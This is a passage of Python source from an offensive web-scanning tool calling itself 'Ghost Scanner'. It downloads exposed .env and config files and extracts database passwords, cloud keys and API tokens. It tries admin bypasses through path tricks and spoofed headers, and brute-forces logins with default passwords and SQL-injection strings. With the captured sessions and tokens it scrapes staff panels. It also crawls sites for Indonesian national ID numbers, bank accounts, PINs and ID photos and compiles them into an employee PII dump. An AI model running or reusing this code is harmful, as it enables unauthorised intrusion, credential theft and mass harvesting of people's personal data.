                              re.findall(r'(?:<script>|<style>)(.*?)(?:</script>|</style>)', text, re.I | re.S)
                              if len(m) > 20][:10]

        for k in out:
            if isinstance(out[k], list):
                out[k] = list(dict.fromkeys([str(x) for x in out[k] if x]))[:200]
        return out

    # ============================================================
    # ENV/CONFIG DOWNLOAD
    # ============================================================
    def _download_env_file(self, url):
        try:
            r = self._smart_request(url, timeout=10, raw=True)
            if not r or r.status_code != 200: return None
            content = r.text or ""
            if len(content) < 5: return None

            looks_env = (
                re.search(r'^[A-Z_][A-Z0-9_]*\s*=', content, re.M) or
                'APP_KEY' in content or 'DB_PASSWORD' in content or
                'SECRET' in content.upper() or 'API_KEY' in content
            )
            if not looks_env and len(content) < 20:
                return None

            ts = int(time.time())
            safe_name = re.sub(r'[^a-zA-Z0-9._-]', '_', os.path.basename(urlparse(url).path) or "env")
            save_path = os.path.join(self.download_folder, "env_files", f"env_{ts}_{safe_name}")
            try:
                with open(save_path, "wb") as f:
                    f.write(r.content)
            except: pass

            secrets = {}
            for line in content.splitlines():
                line = line.strip()
                if not line or line.startswith('#'): continue
                if '=' in line:
                    k, v = line.split('=', 1)
                    k = k.strip()
                    v = v.strip().strip('"').strip("'")
                    if v and len(v) < 500:
                        secrets[k] = v

            extracted = {
                "DB_PASSWORD": [], "DB_USERNAME": [], "DB_HOST": [], "DB_DATABASE": [],
                "APP_KEY": [], "SECRET_KEY": [], "JWT_SECRET": [], "SESSION_SECRET": [],
                "API_KEY": [], "AWS_ACCESS_KEY_ID": [], "AWS_SECRET_ACCESS_KEY": [],
                "STRIPE_SECRET": [], "SENDGRID_API_KEY": [], "MAIL_PASSWORD": [],
                "REDIS_PASSWORD": [], "MONGODB_URI": [], "DATABASE_URL": [],
                "GOOGLE_CLIENT_SECRET": [], "FACEBOOK_SECRET": [], "TWITTER_SECRET": [],
            }
            for k, v in secrets.items():
                ku = k.upper()
                for secret_key in extracted:
                    if secret_key in ku or ku.endswith(secret_key.split('_')[-1]):
                        extracted[secret_key].append(v)
                        break

            return {
                "url": url, "save_path": save_path, "content_size": len(r.content),
                "content_snippet": content[:2000],
                "secrets": {k: v for k, v in extracted.items() if v},
                "total_keys": len(secrets),
                "poc": {"url": url, "curl": f'curl -k -i "{url}" -o {safe_name}',
                         "statusCode": r.status_code, "response": content[:500],
                         "timeDiff": "N/A", "verified": True}
            }
        except Exception:
            return None

    def _download_config_file(self, url):
        try:
            r = self._smart_request(url, timeout=10, raw=True)
            if not r or r.status_code != 200: return None
            content = r.content or b""
            if len(content) < 5: return None
            ts = int(time.time())
            safe_name = re.sub(r'[^a-zA-Z0-9._-]', '_', os.path.basename(urlparse(url).path) or "config")
            save_path = os.path.join(self.download_folder, "config_files", f"config_{ts}_{safe_name}")
            try:
                with open(save_path, "wb") as f:
                    f.write(content)
            except: pass
            text = content.decode("utf-8", errors="ignore")[:5000]
            return {
                "url": url, "save_path": save_path, "content_size": len(content),
                "content_snippet": text[:2000],
                "poc": {"url": url, "curl": f'curl -k -i "{url}" -o {safe_name}',
                         "statusCode": r.status_code, "response": text[:500],
                         "timeDiff": "N/A", "verified": True}
            }
        except Exception:
            return None

    def _scan_env_and_config_files(self, target):
        env_found = []
        config_found = []

        def check_file(path):
            url = target.rstrip('/') + path
            try:
                r = self._smart_request(url, timeout=6)
                if not r or r.status_code != 200: return None
                body = r.text or ""
                if len(body) < 3: return None
                if 'not found' in body.lower()[:200] and len(body) < 500:
                    return None
                if r.status_code == 200 and len(body) > 10:
                    return url
            except: return None
            return None

        env_paths = [p for p in SENSITIVE_FILES_TO_DOWNLOAD if '.env' in p or p in ('/env',)]
        config_paths = [p for p in SENSITIVE_FILES_TO_DOWNLOAD if p not in env_paths]

        with ThreadPoolExecutor(max_workers=min(self.threads, 30)) as ex:
            env_results = list(ex.map(check_file, env_paths))
            config_results = list(ex.map(check_file, config_paths))

        for url in env_results:
            if url:
                info = self._download_env_file(url)
                if info:
                    env_found.append(info)
                    Console().print(f"[bold red]✓ .ENV DOWNLOADED: {url} ({info['content_size']} bytes, {info['total_keys']} keys)[/bold red]")
                    for k, v in info.get('secrets', {}).items():
                        for val in v:
                            self.results_scan["sensitive_data"].setdefault("passwords", []).append(val)
                            self.results_scan["sensitive_data"].setdefault("tokens", []).append(val)

        for url in config_results:
            if url:
                info = self._download_config_file(url)
                if info:
                    config_found.append(info)
                    Console().print(f"[green]✓ CONFIG DOWNLOADED: {url} ({info['content_size']} bytes)[/green]")

        self.results_scan["env_files_found"] = env_found
        self.results_scan["config_files_found"] = config_found

        if env_found:
            for e in env_found:
                self.results_scan["vulnerabilities"]["env_files"].append({
                    "type": ".env File Exposed", "param": "N/A", "payload": "N/A",
                    "evidence": f"Downloaded {e['content_size']} bytes, {e['total_keys']} keys",
                    "risk": "CRITICAL", "confidence": 100, "poc": e["poc"],
                    "secrets": e.get("secrets", {})
                })

        if config_found:
            for c in config_found:
                self.results_scan["vulnerabilities"]["config_files"].append({
                    "type": f"Config File Exposed", "param": "N/A", "payload": "N/A",
                    "evidence": f"Downloaded {c['content_size']} bytes",
                    "risk": "CRITICAL", "confidence": 100, "poc": c["poc"]
                })

        return env_found, config_found

    # ============================================================
    # SERVER IP + REGION
    # ============================================================
    def _get_server_ip(self, domain):
        try:
            return socket.gethostbyname(domain)
        except: return ""

    def _get_ip_info(self, ip):
        if not ip: return None
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp,as,timezone", timeout=8)
            if r.status_code == 200:
                d = r.json()
                if d.get("status") == "success":
                    return d
        except: pass
        return None

    # ============================================================
    # BOT CHECKER (NEW)
    # ============================================================
    def _check_bot_protection(self, target):
        findings = []
        bot_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf_clearance"],
            "Akamai": ["akamai", "x-akamai", "ak_bmsc"],
            "Imperva/Incapsula": ["incap_ses", "visid_incap", "nlbi_"],
            "Sucuri": ["x-sucuri-id", "sucuri"],
            "Fastly": ["fastly", "x-fastly"],
            "AWS WAF": ["x-amzn-waf", "aws-waf"],
            "F5 BIG-IP": ["bigip", "f5"],
            "Barracuda": ["barra", "barracuda"],
            "Radware": ["radware"],
            "Fortinet": ["fortiweb", "fortinet"],
        }
        bot_page_indicators = [
            "checking your browser", "please wait", "ddos protection by",
            "cf-browser-verification", "challenge-form", "recaptcha",
            "hcaptcha", "turnstile", "captcha", "bot detection",
            "access denied", "you have been blocked", "please enable javascript",
        ]
        resp = self._smart_request(target, timeout=10)
        if not resp: return findings
        headers_str = "\n".join(f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items())
        body_low = (resp.text or "").lower()
        detected_wafs = []
        for waf_name, sigs in bot_signatures.items():
            if any(sig in headers_str or sig in body_low for sig in sigs):
                detected_wafs.append(waf_name)
        captcha_detected = [ind for ind in bot_page_indicators if ind in body_low]
        risk = "INFO"
        if detected_wafs:
            risk = "MEDIUM"
        if captcha_detected:
            risk = "HIGH"
        findings.append({
            "type": "Bot Protection Detection", "param": "N/A", "payload": "N/A",
            "evidence": f"WAF: {', '.join(detected_wafs) or 'None'} | CAPTCHA: {', '.join(captcha_detected) or 'None'}",
            "risk": risk, "confidence": 90,
            "poc": {"url": target, "curl": f'curl -I "{target}"',
                     "response": str(resp.headers)[:500], "statusCode": resp.status_code,
                     "timeDiff": "N/A", "verified": True},
            "waf": detected_wafs, "captcha": captcha_detected
        })
        return findings

    # ============================================================
    # ADMIN BYPASS (NEW)
    # ============================================================
    def _admin_bypass(self, target):
        findings = []
        bypass_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Host": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "Referer": target,
            "X-Custom-IP-Authorization": "127.0.0.1",
        }
        bypass_paths = [
            "/admin", "/admin/", "//admin", "/./admin", "/admin/.",
            "/admin%20", "/admin%00", "/ADMIN", "/Admin",
            "/admin..;/", "/.;/admin", "/admin/..;/",
            "/%2e/admin", "/admin/.%2e/", "/admin%2f",
            "/admin?", "/admin#", "/admin/..", "/admin/../admin",
        ]
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings

        for path in bypass_paths:
            url = target.rstrip('/') + path
            r = self._smart_request(url, timeout=6)
            if r and r.status_code in (200, 301, 302, 403):
                if r.status_code == 200:
                    findings.append({
                        "type": f"Admin Bypass (Path Trick)", "param": path,
                        "payload": path, "evidence": f"Status 200 via {path}",
                        "risk": "CRITICAL", "confidence": 85,
                        "poc": {"url": url, "curl": f'curl -k -i "{url}"',
                                 "response": (r.text or "")[:300],
                                 "statusCode": r.status_code,
                                 "timeDiff": "N/A", "verified": True}
                    })
                    Console().print(f"[bold green]✓ ADMIN BYPASS PATH: {url}[/bold green]")
                    break

        for h_name, h_val in bypass_headers.items():
            r = self._smart_request(target, timeout=6, headers={h_name: h_val})
            if r and r.status_code in (200, 301, 302):
                findings.append({
                    "type": f"Admin Bypass (Header)", "param": h_name,
                    "payload": f"{h_name}: {h_val}",
                    "evidence": f"Status {r.status_code} with {h_name}",
                    "risk": "HIGH", "confidence": 75,
                    "poc": {"url": target, "curl": f'curl -k -H "{h_name}: {h_val}" "{target}"',
                             "response": (r.text or "")[:300],
                             "statusCode": r.status_code,
                             "timeDiff": "N/A", "verified": True}
                })

        if findings:
            Console().print(f"[bold green]✓ ADMIN BYPASS: {len(findings)} techniques work[/bold green]")
        return findings

    # ============================================================
    # HARVEST ALL (NEW)
    # ============================================================
    def _harvest_all(self, base):
        Console().print("[bold magenta]═══ HARVEST ALL (Deep Crawl) ═══[/bold magenta]")
        harvested = []
        seen = set()
        queue = [base]
        max_pages = 200 if self.deep else 100 if not self.fast else 50
        processed = 0

        def process_page(url):
            r = self._smart_request(url, timeout=10)
            if not r or r.status_code >= 400:
                return None
            body = r.text or ""
            sens = self._extract_sensitive_data(body)
            links = []
            for href in re.findall(r'href=["\']([^"\'#]+)["\']', body, re.I):
                full = urljoin(url, href)
                if urlparse(full).netloc == urlparse(base).netloc:
                    if not re.search(r'\.(jpg|jpeg|png|gif|css|woff2?|svg|ico|mp4|mp3)$', urlparse(full).path, re.I):
                        links.append(full)
            docs = []
            for doc in re.findall(r'href=["\']([^"\']+\.(?:pdf|xls|xlsx|csv|doc|docx|txt|json|xml|zip|rar))["\']', body, re.I):
                docs.append(urljoin(url, doc))
            return url, sens, links, docs

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(process_page, base): base}
            while futures and processed < max_pages:
                for f in as_completed(list(futures.keys())):
                    try:
                        res = f.result()
                    except:
                        continue
                    futures.pop(f, None)
                    processed += 1
                    if not res:
                        continue
                    url, sens, links, docs = res
                    if url in seen:
                        continue
                    seen.add(url)
                    if sens:
                        harvested.append({"url": url, "data": sens})
                        for k, v in sens.items():
                            self.results_scan["sensitive_data"].setdefault(k, [])
                            self.results_scan["sensitive_data"][k] = list(dict.fromkeys(
                                self.results_scan["sensitive_data"][k] + v))[:500]
                    for l in links:
                        if l not in seen and l not in futures.values() and processed + len(futures) < max_pages:
                            futures[ex.submit(process_page, l)] = l
                    for d in docs[:10]:
                        if d not in seen and processed + len(futures) < max_pages:
                            futures[ex.submit(process_page, d)] = d
                    if processed >= max_pages:
                        break

        for doc in re.findall(r'href=["\']([^"\']+\.(?:pdf|xls|xlsx|csv|doc|docx|txt|json|xml))["\']',
                               self._smart_request(base, timeout=10).text or "", re.I):
            full = urljoin(base, doc)
            if full not in seen:
                dr = self._smart_request(full, timeout=15)
                if dr and dr.status_code == 200:
                    text = self._pdf_text(dr.content) if full.lower().endswith(".pdf") else dr.content.decode("utf-8", errors="ignore")
                    harvested.append({"url": full, "data": self._extract_sensitive_data(text)})

        self.results_scan["harvested_docs"] = harvested
        Console().print(f"[green]✓ Harvest All: {len(harvested)} pages processed[/green]")
        return harvested

    # ============================================================
    # HARVEST (concurrent) - Original
    # ============================================================
    def _harvest_all_sensitive(self, base, html):
        agg = {k: [] for k in self.results_scan["sensitive_data"].keys()}
        seen = set()
        queue = [base]
        pages_limit = 40 if self.fast else (120 if self.deep else 80)

        def fetch_and_parse(url):
            r = self._smart_request(url, timeout=10)
            if not r or r.status_code >= 400:
                return url, None, None
            body = r.text or ""
            sens = self._extract_sensitive_data(body)
            links = []
            for href in re.findall(r'href=["\']([^"\'#]+)["\']', body, re.I):
                full = urljoin(url, href)
                if urlparse(full).netloc != urlparse(base).netloc: continue
                if not full.startswith(('http://', 'https://')): continue
                if re.search(r'\.(jpg|jpeg|png|gif|css|woff2?|svg|ico|mp4|mp3|webp)$',
                             urlparse(full).path, re.I): continue
                links.append(full)
            docs = []
            for doc in re.findall(r'href=["\']([^"\']+\.(?:pdf|xls|xlsx|csv|doc|docx|txt|json|xml))["\']',
                                   body, re.I):
                docs.append(urljoin(url, doc))
            return url, sens, (links, docs)

        processed = 0
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(fetch_and_parse, base): base}
            while futures and processed < pages_limit:
                for f in as_completed(list(futures.keys())):
                    try:
                        url, sens, extras = f.result()
                    except Exception:
                        continue
                    futures.pop(f, None)
                    processed += 1
                    if url in seen: continue
                    seen.add(url)
                    if sens:
                        for k, v in sens.items():
                            agg.setdefault(k, []).extend(v)
                    if extras:
                        links, docs = extras
                        for l in links:
                            if l not in seen and l not in futures.values() and processed + len(futures) < pages_limit:
                                futures[ex.submit(fetch_and_parse, l)] = l
                        for d in docs[:20]:
                            if d not in seen and processed + len(futures) < pages_limit:
                                futures[ex.submit(fetch_and_parse, d)] = d
                    if processed >= pages_limit:
                        break

        for k in agg:
            agg[k] = list(dict.fromkeys([str(x) for x in agg[k] if x]))[:300]

        self.results_scan["nik_regions"] = self._nik_region_breakdown(agg.get("nik", []))
        return agg

    def _nik_region_breakdown(self, niks):
        out = []
        for nik in niks:
            if len(nik) != 16 or not nik.isdigit(): continue
            try:
                d, m, y = int(nik[6:8]), int(nik[8:10]), int(nik[10:12])
                female = d > 40
                if female: d -= 40
                year = 2000 + y if y <= 25 else 1900 + y
                out.append({
                    "nik": nik, "province_code": nik[:2], "regency_code": nik[2:4],
                    "district_code": nik[4:6],
                    "birth": f"{d:02d}-{m:02d}-{year}",
                    "sex": "P" if female else "L",
                })
            except: pass
        return out

    # ============================================================
    # ADMIN POC
    # ============================================================
    def _admin_poc(self, base, forms):
        pocs = []
        creds = [
            ("admin","admin"),("admin","password"),("admin","admin123"),
            ("administrator","administrator"),("root","root"),("root","toor"),
            ("admin","123456"),("admin","12345678"),("admin@admin.com","admin"),
            ("test","test"),("guest","guest"),
            ("admin' -- ","x"),("admin' OR '1'='1' -- ","x"),("' OR 1=1 -- ","' OR 1=1 -- "),
        ]
        for form in forms:
            inputs = form.get("inputs", [])
            if not any(i.get("type", "").lower() == "password" for i in inputs): continue
            action, method = form["url"], form.get("method", "POST")
            uf = next((i["name"] for i in inputs
                       if any(x in i["name"].lower() for x in ["user","email","login","name"])), None)
            pf = next((i["name"] for i in inputs
                       if any(x in i["name"].lower() for x in ["pass","pwd","secret"])), None)
            if not uf or not pf: continue
            extra = {i["name"]: "x" for i in inputs
                     if i["name"] not in (uf, pf) and i.get("type") != "hidden"}

            for user, pwd in creds:
                payload = {uf: user, pf: pwd, **extra}
                pre = self._smart_request(action, timeout=8)
                pre_cookies = pre.cookies.get_dict() if pre else {}
                resp = self._smart_request(action, timeout=12, method=method, data=payload)
                if not resp: continue
                body_low = (resp.text or "").lower()
                hit = (resp.status_code in (301, 302, 303)
                       or any(t in body_low for t in
                              ["dashboard","logout","welcome","profile","sign out","keluar","beranda",
                               "admin panel","control panel"]))
                if not hit: continue
                curl = (f'curl -k -X {method} "{action}" '
                        f'-d "{urlencode(payload)}" -c cookies.txt -b cookies.txt -i')
                pocs.append({
                    "url": action, "method": method,
                    "credentials": {"user_field": uf, "pass_field": pf, "user": user, "pass": pwd},
                    "redirect": resp.headers.get("Location", ""),
                    "post_cookies": {**pre_cookies, **resp.cookies.get_dict()},
                    "status": resp.status_code,
                    "body_snippet": (resp.text or "")[:600],
                    "curl": curl, "verified": True
                })
                Console().print(f"[bold green]✓ ADMIN via {uf}={user!r} → {action} ({resp.status_code})[/bold green]")
                try:
                    if resp.cookies:
                        self.session.cookies.update(resp.cookies)
                        admin_html = self._smart_request(action, timeout=10)
                        if admin_html:
                            self.results_scan["admin_data"] = self._extract_sensitive_data(admin_html.text or "")
                            for panel in re.findall(
                                r'href=["\']([^"\']*(?:karyawan|pegawai|user|member|data|admin)[^"\']*)["\']',
                                admin_html.text or "", re.I)[:8]:
                                purl = urljoin(action, panel)
                                pr = self._smart_request(purl, timeout=10)
                                if pr and pr.status_code == 200:
                                    for k, v in self._extract_sensitive_data(pr.text or "").items():
                                        self.results_scan["admin_data"].setdefault(k, []).extend(v)
                                    pocs.append({
                                        "admin_panel": purl, "status": pr.status_code,
                                        "curl": f'curl -k -b cookies.txt "{purl}"',
                                        "snippet": (pr.text or "")[:400], "verified": True
                                    })
                except Exception: pass
                break
        self.results_scan["vulnerabilities"]["admin_access"] = pocs
        self.results_scan["vulnerabilities"]["login_bypass"] = [
            p for p in pocs if "'" in p["credentials"]["user"]
        ]
        return pocs

    def _detect_spa_login(self, html, base):
        endpoints = set()
        for pat in [r'["\'](/[^"\']*(?:login|signin|auth|session|token)[^"\']*)["\']',
                    r'["\'](https?://[^"\']*(?:login|signin|auth)[^"\']*)["\']']:
            for m in re.findall(pat, html or "", re.I):
                u = urljoin(base, m)
                if urlparse(u).netloc == urlparse(base).netloc:
                    endpoints.add(u)
        for p in ["/api/login","/api/auth/login","/api/v1/login","/auth/login",
                  "/api/session","/api/token","/wp-json/jwt-auth/v1/token",
                  "/api/users/login","/login","/signin"]:
            endpoints.add(base.rstrip("/") + p)
        return list(endpoints)

    def _admin_poc_api(self, base, endpoints):
        pocs = []
        creds = [("admin","admin"),("admin","password"),("admin","admin123"),
                 ("administrator","administrator"),("root","root"),("admin@admin.com","admin"),
                 ("admin","123456"),("test","test"),("guest","guest")]
        injections = [
            {"username":"admin' OR '1'='1' -- ","password":"***"},
            {"username":"admin'--","password":"***"},
            {"email":"admin' OR 1=1--","password":"***"},
            {"user":"' OR 1=1#","pass":"x"},
        ]
        bodies = ([{"username":u,"password":p} for u,p in creds] +
                  [{"email":u,"password":p} for u,p in creds] + injections)

        for ep in endpoints[:10]:
            for body in bodies:
                try:
                    r = self._smart_request(ep, timeout=8, method="POST",
                                            data=json.dumps(body),
                                            headers={"Content-Type":"application/json"})
                    if not r: continue
                    tl = (r.text or "").lower()
                    hit = (r.status_code == 200 and any(k in tl for k in
                           ["token","access_token","jwt","session","authenticated",
                            "success\":true","\"role\":\"admin\""]))
                    if hit:
                        pocs.append({
                            "endpoint": ep, "method": "POST", "body": body,
                            "status": r.status_code, "response": (r.text or "")[:600],
                            "curl": f'curl -k -X POST "{ep}" -H "Content-Type: application/json" -d \'{json.dumps(body)}\'',
                            "verified": True
                        })
                        Console().print(f"[bold green]✓ API ADMIN: {ep} {body}[/bold green]")
                        tok = re.search(r'"(?:access_)?token"\s*:\s*"([^"]+)"', r.text or "")
                        if tok:
                            self.session.headers["Authorization"] = f"Bearer {tok.group(1)}"
                            for panel in ["/api/me","/api/user","/api/profile","/api/users",
                                          "/api/employees","/api/karyawan","/api/pegawai"]:
                                pr = self._smart_request(base.rstrip("/") + panel, timeout=8)
                                if pr and pr.status_code == 200:
                                    for k,v in self._extract_sensitive_data(pr.text or "").items():
                                        self.results_scan["admin_data"].setdefault(k, []).extend(v)
                                    pocs.append({
                                        "admin_panel": base.rstrip("/") + panel,
                                        "status": pr.status_code,
                                        "curl": f'curl -k -H "Authorization: Bearer ***" "{base.rstrip("/") + panel}"',
                                        "snippet": (pr.text or "")[:400],
                                        "verified": True
                                    })
                        break
                except Exception:
                    continue
        return pocs

    # ============================================================
    # PORT PROBE
    # ============================================================
    def _probe_ports_real(self, domain):
        ports = self.common_ports + [2375, 5000, 5601, 7001, 8000, 8008, 8081, 8088,
                                      8888, 9000, 9090, 9200, 9300, 10000, 11211, 27017]
        results = []
        lock = threading.Lock()

        def check(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.2)
                if s.connect_ex((domain, port)) != 0:
                    s.close(); return
                banner = b""
                try:
                    s.settimeout(1.5)
                    s.send(b"\r\n")
                    banner = s.recv(256)
                except: pass
                s.close()
                rec = {
                    "host": domain, "port": port, "open": True,
                    "banner": banner.decode("latin-1", errors="ignore").strip()[:200],
                    "service": self._fingerprint(port, banner),
                }
                if port in (80, 8080, 8000, 8888, 5000, 8081, 8088, 9090, 7001, 9000, 10000):
                    scheme = "http"
                elif port in (443, 8443, 8008):
                    scheme = "https"
                else:
                    scheme = None
                if scheme:
                    u = f"{scheme}://{domain}:{port}/"
                    r = self._smart_request(u, timeout=5, use_proxy=False)
                    if r:
                        rec["http_status"] = r.status_code
                        rec["server"] = r.headers.get("Server", "")
                        t = re.search(r"<title>(.*?)</title>", r.text or "", re.I)
                        rec["title"] = (t.group(1) if t else "")[:120]
                        rec["poc"] = {"url": u, "curl": f'curl -k -i "{u}"',
                                       "statusCode": r.status_code, "verified": True}
                if port in (443, 8443):
                    try:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        with socket.create_connection((domain, port), timeout=5) as raw:
                            with ctx.wrap_socket(raw, server_hostname=domain) as ss:
                                cert = ss.getpeercert()
                                rec["tls"] = {k: str(v) for k, v in (cert or {}).items()
                                              if k in ("subject","issuer","notAfter")}
                    except: pass
                rec["risk"] = self._port_risk(port)
                with lock:
                    results.append(rec)
                    Console().print(f"[green]✓ {domain}:{port} open — {rec['service']}[/green]")
            except Exception: pass

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(check, ports))

        order = {"CRITICAL":0, "HIGH":1, "MEDIUM":2, "INFO":3}
        results.sort(key=lambda x: order.get(x.get("risk","INFO"), 9))
        self.results_scan["ports_real"] = results
        return results

    def _fingerprint(self, port, banner):
        known = {21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",110:"pop3",
                 143:"imap",443:"https",445:"smb",993:"imaps",995:"pop3s",1433:"mssql",
                 1521:"oracle",2375:"docker-api",3306:"mysql",3389:"rdp",5432:"postgres",
                 5601:"kibana",5900:"vnc",6379:"redis",7001:"weblogic",8000:"http-alt",
                 8080:"http-proxy",8443:"https-alt",9000:"php-fpm",9200:"elasticsearch",
                 9300:"es-transport",11211:"memcached",27017:"mongodb"}
        return known.get(port, "unknown")

    def _port_risk(self, port):
        if port in {2375,6379,27017,9200,11211,7001,9000}: return "CRITICAL"
        if port in {22,3306,5432,1433,1521,3389,5900}:    return "HIGH"
        if port in {21,23,25,445,5601,10000}:             return "MEDIUM"
        return "INFO"

    # ============================================================
    # PDF / DOCS
    # ============================================================
    def _pdf_text(self, content_bytes, save_path=None):
        text = ""
        try:
            if shutil.which("pdftotext"):
                with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tf:
                    tf.write(content_bytes)
                    tmp = tf.name
                out = subprocess.run(["pdftotext", "-layout", tmp, "-"],
                                     capture_output=True, timeout=30,
                                     text=True, encoding="utf-8", errors="ignore")
                text = out.stdout or ""
                try: os.unlink(tmp)
                except: pass
        except: pass
        if not text:
            text = content_bytes.decode("latin-1", errors="ignore")
        if save_path:
            try:
                with open(save_path, "wb") as f: f.write(content_bytes)
            except: pass
        return text

    def _harvest_documents(self, base):
        docs = []
        seen = set()
        queue = [base]
        visited = set()
        doc_ext = re.compile(r'\.(pdf|xls|xlsx|csv|doc|docx|txt|json|xml|zip|rar)(\?|$)', re.I)
        photo_ext = re.compile(r'\.(jpg|jpeg|png|webp)$', re.I)
        limit = 30 if self.fast else (100 if self.deep else 60)

        while queue and len(visited) < limit:
            url = queue.pop(0)
            if url in visited: continue
            visited.add(url)
            r = self._smart_request(url, timeout=10)
            if not r or r.status_code >= 400: continue
            body = r.text or ""
            for href in re.findall(r'href=["\']([^"\'#]+)["\']', body, re.I):
                full = urljoin(url, href)
                if urlparse(full).netloc != urlparse(base).netloc: continue
                if full in seen: continue
                seen.add(full)
                if doc_ext.search(full):
                    dr = self._smart_request(full, timeout=15)
                    if dr and dr.status_code == 200 and len(dr.content) > 100:
                        name = os.path.basename(urlparse(full).path) or f"doc_{len(docs)}"
                        save = os.path.join(self.sensitive_folder, name)
                        text = self._pdf_text(dr.content, save) if full.lower().endswith(".pdf") \
                               else dr.content.decode("utf-8", errors="ignore")
                        pii = self._extract_sensitive_data(text)
                        docs.append({
                            "url": full, "file": save, "bytes": len(dr.content),
                            "text_snippet": text[:1500], "pii": pii,
                            "poc": {"url": full, "curl": f'curl -k "{full}" -o {name}',
                                    "statusCode": dr.status_code, "verified": True}
                        })
                elif photo_ext.search(full) and any(k in full.lower() for k in
                                                     ["ktp","kk","nik","foto","pegawai","karyawan","selfie","identitas"]):
                    dr = self._smart_request(full, timeout=10)
                    if dr and dr.status_code == 200 and len(dr.content) > 1000:
                        name = os.path.basename(urlparse(full).path) or f"photo_{len(docs)}.jpg"
                        save = os.path.join(self.sensitive_folder, "photos", name)
                        try:
                            with open(save, "wb") as f: f.write(dr.content)
                        except: pass
                        docs.append({
                            "url": full, "file": save, "bytes": len(dr.content),
                            "type": "photo", "pii": {},
                            "poc": {"url": full, "curl": f'curl -k "{full}" -o {name}',
                                    "statusCode": dr.status_code, "verified": True}
                        })
                elif not doc_ext.search(full) and not photo_ext.search(full):
                    if not re.search(r'\.(css|js|woff2?|svg|ico|map)$', urlparse(full).path, re.I):
                        queue.append(full)
        self.results_scan["harvested_docs"] = docs
        return docs

    def _build_employee_records(self, sensitive, harvested_docs):
        records = {}
        def ensure(key):
            if key not in records:
                records[key] = {"phone": "", "emails": [], "nik": [], "bank": [],
                                "rekening": [], "npwp": [], "nip": [], "pin": [], "sources": []}
            return records[key]

        for ph in sensitive.get("no_hp", []) + sensitive.get("phone_intl", []):
            r = ensure(ph); r["phone"] = ph
        for em in sensitive.get("email", []):
            local = em.split("@")[0].lower()
            matched = None
            for ph in list(records):
                if local and (local in ph or (len(ph) > 6 and ph[-6:] in local)):
                    matched = ph; break
            if matched:
                records[matched]["emails"].append(em)
            else:
                r = ensure(em); r["emails"].append(em)
        for nik in sensitive.get("nik", []):
            for ph in list(records):
                if ph and ph in nik: records[ph]["nik"].append(nik)
        for rek in sensitive.get("no_rekening", []):
            for ph in list(records):
                if ph and ph in rek: records[ph]["rekening"].append(rek)
        for pin in sensitive.get("pin", []):
            for ph in list(records):
                records[ph]["pin"].append(pin)
        for doc in harvested_docs or []:
            for ph in list(records):
                if ph and ph in json.dumps(doc): records[ph]["sources"].append(doc.get("url",""))
        return [v for v in records.values() if v.get("phone") or v.get("emails")]

    def _generate_employee_pdf(self, records, target):
        if not records: return None
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font("Arial","B",14)
                    self.cell(0,10,"EMPLOYEE / PII DUMP - Ghost Scanner v5.7",ln=True,align="C")
                    self.ln(3)
                def footer(self):
                    self.set_y(-15); self.set_font("Arial","I",8)
                    self.cell(0,10,f"Target: {target}",align="C")
            pdf = PDF(); pdf.add_page()
            pdf.set_font("Arial","",10)
            pdf.cell(0,8,f"Target: {target}",ln=True)
            pdf.cell(0,8,f"Records: {len(records)}",ln=True)
            pdf.ln(4)
            for i, rec in enumerate(records[:300],1):
                pdf.set_font("Arial","B",10)
                label = rec.get("phone") or (rec.get("emails") or ["unknown"])[0]
                pdf.cell(0,6,f"{i}. {label}",ln=True)
                pdf.set_font("Arial","",9)
                for k in ("phone","emails","nik","npwp","nip","bank","rekening","pin","sources"):
                    v = rec.get(k)
                    if v: pdf.multi_cell(0,5,f"   {k.upper()}: {json.dumps(v,ensure_ascii=False)[:400]}")
                pdf.ln(1)
            fn = os.path.join(self.sensitive_folder, f"employees_{int(time.time())}.pdf")
            pdf.output(fn)
            Console().print(f"[green]✓ Employee PDF: {fn}[/green]")
            return fn
        except Exception as e:
            Console().print(f"[yellow]Employee PDF error: {e}[/yellow]")
            return None

    # ============================================================
    # AI
    # ============================================================
    def _ai_analysis(self, findings, target, admin_data=None):
        if not self.ai: return "", ""
        Console().print("[yellow]Running AI analysis...[/yellow]")
        admin_ctx = f"\n\nADMIN DATA:\n{json.dumps(admin_data, indent=2)[:3000]}" if admin_data else ""
        prompt = f"""Anda Senior Cyber Security Consultant (OSCP, CISSP, CEH).
Target: {target}
Category: {self.results_scan.get('domain_category','Unknown')} / {self.results_scan.get('domain_subcategory','')}
Region: {self.results_scan.get('region',{}).get('country','Unknown')}

FINDINGS:
{json.dumps(findings, indent=2)[:8000]}{admin_ctx}

Berikan analisis Markdown:
## 1. RINGKASAN EKSEKUTIF
## 2. TEMUAN KRITIS & DAMPAK BISNIS
## 3. TEMUAN HIGH & MEDIUM
## 4. ANALISIS DATA SENSITIF (UU PDP/GDPR)
## 5. REKOMENDASI PERBAIKAN (PRIORITAS)
## 6. ACTION PLAN 30-60-90 HARI
## 7. SARAN PENGUJIAN LANJUTAN
## 8. KRITIK KONSTRUKTIF & BEST PRACTICES
"""
        for api_key in AI_KEYS:
            for model in AI_MODELS:
                for attempt in range(2):
                    try:
                        r = requests.post(
                            f"{AI_BASE_URL}/chat/completions",
                            headers={'Authorization': f'Bearer {api_key}',
                                     'Content-Type': 'application/json'},
                            json={"model": model,
                                  "messages": [{"role":"user","content":prompt}],
                                  "max_tokens": 4000},
